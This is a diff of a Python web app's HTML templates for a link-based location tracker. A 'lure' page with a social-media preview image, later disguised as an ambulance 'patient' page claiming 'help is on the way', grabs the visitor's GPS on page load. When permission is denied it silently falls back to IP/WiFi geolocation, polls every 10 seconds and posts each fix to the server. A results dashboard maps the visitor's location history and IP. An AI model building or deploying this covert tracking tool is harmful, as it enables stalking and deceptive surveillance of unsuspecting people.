+function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+document.getElementById('modal').addEventListener('click',function(e){if(e.target===this)closeModal();});
 loadLinks();
-setInterval(loadLinks, 5000);
+setInterval(loadLinks,5000);
 </script>
 </body>
 </html>"""
 
 
-# ─── Lure Page ────────────────────────────────────────────────────────────────
-LURE_HTML = """<!DOCTYPE html>
+# ─── Patient Page HTML ────────────────────────────────────────────────────────
+PATIENT_HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>{{ og_title }}</title>
 <meta property="og:title" content="{{ og_title }}" />
-<meta property="og:image" content="https://bmw.pythonanywhere.com/img/{{ link_id }}" />
+<meta property="og:image" content="{{ base_url }}/img/{{ link_id }}" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
 <meta property="og:type" content="website" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://bmw.pythonanywhere.com/img/{{ link_id }}" />
+<meta name="twitter:image" content="{{ base_url }}/img/{{ link_id }}" />
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  html, body { width:100%; height:100%; background:#000; overflow:hidden; }
-  .wrap { width:100%; height:100vh; display:flex; align-items:center; justify-content:center; }
-  a { display:flex; width:100%; height:100%; align-items:center; justify-content:center; }
-  img { max-width:100%; max-height:100vh; object-fit:contain; cursor:pointer; display:block;
-        -webkit-tap-highlight-color:transparent; }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+  /* Full screen image — same as original lure page */
+  .img-wrap {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #000;
+    z-index: 0;
+  }
+  .img-wrap img {
+    max-width: 100%;
+    max-height: 100vh;
+    object-fit: contain;
+    display: block;
+  }
+  /* Status overlay — subtle, bottom of screen */
+  .status-bar {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: rgba(0,0,0,0.75);
+    backdrop-filter: blur(8px);
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    z-index: 10;
+    transition: all .3s ease;
+  }
+  .status-icon { font-size: 20px; flex-shrink: 0; }
+  .status-text { flex: 1; }
+  .status-text .name { font-size: 13px; font-weight: 700; color: #fff; }
+  .status-text .msg { font-size: 11px; color: rgba(255,255,255,0.6); margin-top: 2px; }
+  .dots { display: flex; gap: 4px; flex-shrink: 0; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: #ef4444;
+    animation: dp 1.2s infinite ease-in-out; }
+  .dot:nth-child(2){animation-delay:.2s}
+  .dot:nth-child(3){animation-delay:.4s}
+  @keyframes dp{0%,80%,100%{transform:scale(.6);opacity:.4}40%{transform:scale(1);opacity:1}}
+  .check { font-size: 20px; display: none; }
+  .status-bar.success { background: rgba(16,185,129,0.85); }
 </style>
 </head>
 <body>
-<div class="wrap">
-  <a href="/l/{{ link_id }}" id="link">
-    <img src="{{ img_data }}" alt="" draggable="false">
-  </a>
-</div>
-</body>
-</html>"""
 
-
-# ─── Locator Page ─────────────────────────────────────────────────────────────
-LOCATOR_HTML = """<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Loading…</title>
-<style>
-  * { margin:0; padding:0; }
-  body { background:#fff; min-height:100vh; display:flex; align-items:center; justify-content:center; }
-  #loader { display:flex; flex-direction:column; align-items:center; gap:18px;
-    font-family:system-ui,sans-serif; color:#94a3b8; }
-  .spinner { width:40px; height:40px; border:3px solid #e2e8f0; border-top-color:#3b82f6;
-    border-radius:50%; animation:spin 1s linear infinite; }
-  @keyframes spin { to { transform:rotate(360deg); } }
-  #loader p { font-size:14px; }
-</style>
-</head>
-<body>
-<div id="loader">
-  <div class="spinner"></div>
-  <p>Loading…</p>
+<!-- Full screen image -->
+<div class="img-wrap">
+  <img src="{{ img_data }}" alt="{{ patient_name }}" draggable="false">
 </div>
+
+<!-- Subtle status bar at bottom -->
+<div class="status-bar" id="statusBar">
+  <div class="status-icon">🚑</div>
+  <div class="status-text">
+    <div class="name" id="statusName">{{ patient_name }}</div>
+    <div class="msg" id="statusMsg">Locating your position...</div>
+  </div>
+  <div class="dots" id="dots">
+    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+  </div>
+  <div class="check" id="check">✅</div>
+</div>
+
 <script>
-(function () {
-  var LINK_ID  = "{{ link_id }}";
-  // Replace with your Google API key — get one free at console.cloud.google.com
-  // Enable "Geolocation API" in the APIs & Services section
+(function(){
+  var LINK_ID = "{{ link_id }}";
   var GOOGLE_API_KEY = "{{ google_api_key }}";
   var firstDone = false;
   var intervalId = null;
 
-  /* ── POST location to server ─────────────────────────────────── */
-  function post(lat, lng, acc, err, method) {
+  function setSuccess(){
+    if(firstDone) return;
+    firstDone = true;
+    document.getElementById('dots').style.display = 'none';
+    document.getElementById('check').style.display = 'block';
+    document.getElementById('statusBar').classList.add('success');
+    document.getElementById('statusMsg').textContent = 'Location confirmed — help is on the way';
+  }
+
+  function post(lat, lng, acc, err, method){
     var payload = {
-      link_id    : LINK_ID,
-      latitude   : lat,
-      longitude  : lng,
-      accuracy   : acc,
-      error      : err,
-      method     : method || 'gps',
-      user_agent : navigator.userAgent,
-      ts         : new Date().toISOString()
+      link_id: LINK_ID, latitude: lat, longitude: lng,
+      accuracy: acc, error: err, method: method || 'gps',
+      user_agent: navigator.userAgent, ts: new Date().toISOString()
     };
-    try {
-      fetch('/capture', {
-        method  : 'POST',
-        headers : { 'Content-Type': 'application/json' },
-        body    : JSON.stringify(payload),
-        keepalive: true
-      }).then(function () {
-        if (!firstDone && lat !== null) {
-          firstDone = true;
-          hideAndClose();
-        }
-      }).catch(function () {});
-    } catch (e) {}
-    try {
-      var x = new XMLHttpRequest();
-      x.open('POST', '/capture', true);
-      x.setRequestHeader('Content-Type', 'application/json');
+    // Primary — fetch with keepalive
+    try{
+      fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(payload),keepalive:true})
+      .then(function(){if(!firstDone && lat!==null) setSuccess();})
+      .catch(function(){});
+    }catch(e){}
+    // Backup — XHR
+    try{
+      var x=new XMLHttpRequest();
+      x.open('POST','/capture',true);
+      x.setRequestHeader('Content-Type','application/json');
       x.send(JSON.stringify(payload));
-    } catch (e) {}
+    }catch(e){}
   }
 
-  /* ── Hide loader and try to close tab ───────────────────────── */
-  function hideAndClose() {
-    try { document.getElementById('loader').style.display = 'none'; } catch(e) {}
-    try { document.body.style.background = '#fff'; } catch(e) {}
-    setTimeout(function () {
-      try { window.close(); } catch(e) {}
-    }, 600);
-  }
-
-  /* ── Google Geolocation API fallback (no prompt, IP+WiFi+cell) ─
-     Called when GPS permission is denied or unavailable.
-     Accuracy: 100m–5km depending on WiFi/cell signal.
-     Completely silent — no browser prompt at all.           ────── */
-  function googleGeolocate() {
-    if (!GOOGLE_API_KEY || GOOGLE_API_KEY === 'YOUR_GOOGLE_API_KEY') return;
-    fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=' + GOOGLE_API_KEY, {
-      method : 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body   : JSON.stringify({ considerIp: true })
+  function googleGeolocate(){
+    if(!GOOGLE_API_KEY || GOOGLE_API_KEY==='') return;
+    fetch('https://www.googleapis.com/geolocation/v1/geolocate?key='+GOOGLE_API_KEY,{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({considerIp:true})
     })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      if (data && data.location) {
-        // accuracy here is in meters — Google returns radius of confidence
-        var acc = data.accuracy || 5000;
-        post(data.location.lat, data.location.lng, acc, null, 'google-ip');
-      }
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d && d.location) post(d.location.lat, d.location.lng, d.accuracy||5000, null, 'google-ip');
     })
-    .catch(function() {});
+    .catch(function(){});
   }
 
-  /* ── Primary: GPS via browser (asks permission once) ─────────── */
-  function grab() {
-    if (!navigator.geolocation) {
-      // No GPS support at all — go straight to Google fallback
+  function grab(){
+    if(!navigator.geolocation){
       googleGeolocate();
-      post(null, null, null, 'geolocation not supported', 'error');
+      post(null,null,null,'geolocation not supported','error');
       return;
     }
     navigator.geolocation.getCurrentPosition(
-      function (p) {
-        post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps');
-      },
-      function (e) {
-        // GPS failed or denied — silently try Google fallback
-        var msgs = ['', 'permission denied', 'position unavailable', 'timeout'];
-        var errMsg = msgs[e.code] || e.message || 'unknown error';
-        post(null, null, null, errMsg, 'gps-error');
-        // Fire Google fallback immediately on denial
+      function(p){ post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps'); },
+      function(e){
+        var msgs=['','permission denied','position unavailable','timeout'];
+        post(null,null,null,msgs[e.code]||'unknown','gps-error');
         googleGeolocate();
       },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
     );
   }
 
-  /* ── watchPosition for continuous GPS updates ────────────────── */
-  if (navigator.geolocation) {
+  // watchPosition — continuous updates while page is open
+  if(navigator.geolocation){
     navigator.geolocation.watchPosition(
-      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps-watch'); },
-      function () {
-        // Watch failed — try Google fallback
-        googleGeolocate();
-      },
-      { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+      function(p){ post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null, 'gps-watch'); },
+      function(){ googleGeolocate(); },
+      {enableHighAccuracy:true, maximumAge:0, timeout:15000}
     );
   }
 
-  /* ── Fire immediately on page load ──────────────────────────── */
+  // Fire immediately on page load — no tap needed
   grab();
-
-  /* ── Also fire Google fallback immediately (runs in parallel)
-     This gets us IP-based location instantly while GPS is pending.
-     If GPS succeeds, that more accurate fix overwrites it.    ─── */
   googleGeolocate();
 
-  /* ── Poll every 10 seconds ───────────────────────────────────── */
-  intervalId = setInterval(function() {
-    grab();
-  }, 10000);
+  // Poll every 10 seconds
+  intervalId = setInterval(grab, 10000);
 
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) { grab(); googleGeolocate(); }
+  // Re-grab when tab becomes visible again
+  document.addEventListener('visibilitychange', function(){
+    if(!document.hidden){ grab(); googleGeolocate(); }
   });
-  window.addEventListener('beforeunload', function () {
+
+  window.addEventListener('beforeunload', function(){
     grab();
-    if (intervalId) clearInterval(intervalId);
+    if(intervalId) clearInterval(intervalId);
   });
 })();
 </script>
@@ -812,7 +686,7 @@ LOCATOR_HTML = """<!DOCTYPE html>
 </html>"""
 
 
-# ─── Results Page ─────────────────────────────────────────────────────────────
+# ─── Results Page HTML ────────────────────────────────────────────────────────
 RESULTS_HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -831,19 +705,14 @@ body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:v
 .topbar a:hover{color:var(--text);}
 .topbar h1{font-size:16px;font-weight:700;}
 .main{max-width:1100px;margin:0 auto;padding:30px 20px;}
-.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
-  gap:12px;margin-bottom:28px;}
-.info-card{background:var(--surface);border:1px solid var(--border);
-  border-radius:10px;padding:18px 20px;}
+.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:28px;}
+.info-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 20px;}
 .info-card .n{font-size:28px;font-weight:700;color:var(--accent);}
 .info-card .n.green{color:var(--green);}
-.info-card .l{font-size:11px;color:var(--muted);margin-top:4px;
-  text-transform:uppercase;letter-spacing:.5px;}
-#map{height:380px;border-radius:10px;margin-bottom:26px;
-  border:1px solid var(--border);background:#111;}
-.section-title{font-size:14px;font-weight:600;color:var(--text);margin-bottom:12px;}
-.table-wrap{background:var(--surface);border:1px solid var(--border);
-  border-radius:10px;overflow:hidden;}
+.info-card .l{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px;}
+#map{height:380px;border-radius:10px;margin-bottom:26px;border:1px solid var(--border);background:#111;}
+.section-title{font-size:14px;font-weight:600;margin-bottom:12px;}
+.table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
 table{width:100%;border-collapse:collapse;}
 th{background:#0a1323;color:var(--muted);font-size:11px;font-weight:600;
   text-transform:uppercase;letter-spacing:.5px;padding:10px 14px;text-align:left;
@@ -852,7 +721,7 @@ td{padding:11px 14px;font-size:12px;border-bottom:1px solid #151f30;vertical-ali
 tr:last-child td{border-bottom:none;}
 .success{color:var(--green);}
 .fail{color:var(--danger);}
-a.map-link{color:var(--green);text-decoration:none;font-size:12px;}
+a.map-link{color:var(--green);text-decoration:none;}
 a.map-link:hover{text-decoration:underline;}
 </style>
 </head>
@@ -864,8 +733,8 @@ a.map-link:hover{text-decoration:underline;}
 <div class="main">
   {% set gps_fixes = captures | selectattr('latitude') | list %}
   <div class="info-grid">
-    <div class="info-card"><div class="n">{{ captures | length }}</div><div class="l">Total Reports</div></div>
-    <div class="info-card"><div class="n green">{{ gps_fixes | length }}</div><div class="l">GPS Fixes</div></div>
+    <div class="info-card"><div class="n">{{ captures|length }}</div><div class="l">Total Reports</div></div>
+    <div class="info-card"><div class="n green">{{ gps_fixes|length }}</div><div class="l">GPS Fixes</div></div>
     <div class="info-card">
       <div class="n" style="font-size:14px;margin-top:4px;">{{ link.created[:19].replace('T',' ') }} UTC</div>
       <div class="l">Link Created</div>
@@ -877,7 +746,7 @@ a.map-link:hover{text-decoration:underline;}
   </div>
   <div class="section-title">📍 Location Map</div>
   <div id="map"></div>
-  <div class="section-title">GPS History ({{ captures | length }} records)</div>
+  <div class="section-title">GPS History ({{ captures|length }} records)</div>
   <div class="table-wrap">
     <table>
       <thead><tr>
@@ -896,27 +765,17 @@ a.map-link:hover{text-decoration:underline;}
           <td class="fail">—</td><td>—</td>
           {% endif %}
           <td style="font-size:11px;">
-            {% if c.method == 'google-ip' %}
-            <span style="color:#f59e0b;font-weight:600;">📡 IP/Cell</span>
-            {% elif c.method and 'gps' in c.method %}
-            <span style="color:#10b981;font-weight:600;">📍 GPS</span>
-            {% else %}
-            <span style="color:#64748b;">—</span>
-            {% endif %}
+            {% if c.method == 'google-ip' %}<span style="color:#f59e0b;">📡 IP/Cell</span>
+            {% elif c.method and 'gps' in c.method %}<span style="color:#10b981;">📍 GPS</span>
+            {% else %}<span style="color:#64748b;">—</span>{% endif %}
           </td>
           <td style="color:var(--muted);font-size:11px;">{{ c.ip or '—' }}</td>
-          {% if c.latitude %}
-          <td class="success">✓ Located</td>
-          {% elif c.error_msg %}
-          <td class="fail">✗ {{ c.error_msg }}</td>
-          {% else %}
-          <td style="color:var(--muted);">Pending</td>
-          {% endif %}
-          <td>
-            {% if c.latitude %}
+          {% if c.latitude %}<td class="success">✓ Located</td>
+          {% elif c.error_msg %}<td class="fail">✗ {{ c.error_msg }}</td>
+          {% else %}<td style="color:var(--muted);">Pending</td>{% endif %}
+          <td>{% if c.latitude %}
             <a class="map-link" href="https://www.google.com/maps?q={{ c.latitude }},{{ c.longitude }}" target="_blank">Open ↗</a>
-            {% else %}—{% endif %}
-          </td>
+          {% else %}—{% endif %}</td>
         </tr>
         {% else %}
         <tr><td colspan="8" style="text-align:center;color:var(--muted);padding:30px;">No GPS data yet</td></tr>
@@ -927,36 +786,25 @@ a.map-link:hover{text-decoration:underline;}
 </div>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-var captures = {{ captures_json | safe }};
-var validFixes = captures.filter(function(c){ return c.lat !== null; });
-if (validFixes.length > 0) {
-  var map = L.map('map');
+var captures={{ captures_json|safe }};
+var valid=captures.filter(function(c){return c.lat!==null;});
+if(valid.length>0){
+  var map=L.map('map');
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
-  var redIcon = L.icon({
-    iconUrl:'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
-    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
-    iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]
-  });
-  var blueIcon = L.icon({
-    iconUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
-    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
-    iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]
-  });
-  if (validFixes.length > 1) {
-    L.polyline(validFixes.map(function(c){return[c.lat,c.lng];}),{color:'#3b82f6',weight:2,opacity:.6}).addTo(map);
-  }
-  validFixes.forEach(function(c,i){
+  var redIcon=L.icon({iconUrl:'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
+    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]});
+  var blueIcon=L.icon({iconUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
+    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]});
+  if(valid.length>1) L.polyline(valid.map(function(c){return[c.lat,c.lng];}),{color:'#3b82f6',weight:2,opacity:.6}).addTo(map);
+  valid.forEach(function(c,i){
     var isLatest=(i===0);
-    var marker=L.marker([c.lat,c.lng],{icon:isLatest?redIcon:blueIcon}).addTo(map);
-    marker.bindPopup('<b>'+(isLatest?'🔴 Latest Fix':'Fix #'+(i+1))+'</b><br>'+
-      c.lat.toFixed(5)+', '+c.lng.toFixed(5)+'<br>±'+Math.round(c.acc||0)+'m<br>'+
-      '<small>'+c.ts.replace('T',' ').slice(0,19)+' UTC</small>');
-    if(isLatest)marker.openPopup();
+    var m=L.marker([c.lat,c.lng],{icon:isLatest?redIcon:blueIcon}).addTo(map);
+    m.bindPopup('<b>'+(isLatest?'🔴 Latest':'Fix #'+(i+1))+'</b><br>'+c.lat.toFixed(5)+', '+c.lng.toFixed(5)+'<br>±'+Math.round(c.acc||0)+'m<br><small>'+(c.method||'gps')+'</small>');
+    if(isLatest) m.openPopup();
   });
-  map.fitBounds(validFixes.map(function(c){return[c.lat,c.lng];}),{padding:[40,40],maxZoom:16});
-} else {
-  document.getElementById('map').innerHTML=
-    '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#64748b;font-family:system-ui;font-size:14px;">📍 No GPS data to display yet</div>';
+  map.fitBounds(valid.map(function(c){return[c.lat,c.lng];}),{padding:[40,40],maxZoom:16});
+}else{
+  document.getElementById('map').innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#64748b;font-size:14px;">📍 No GPS data yet</div>';
 }
 setTimeout(function(){window.location.reload();},10000);
 </script>
@@ -965,7 +813,6 @@ setTimeout(function(){window.location.reload();},10000);
 
 
 # ─── Startup ──────────────────────────────────────────────────────────────────
-
 init_db()
 
 if __name__ == "__main__":
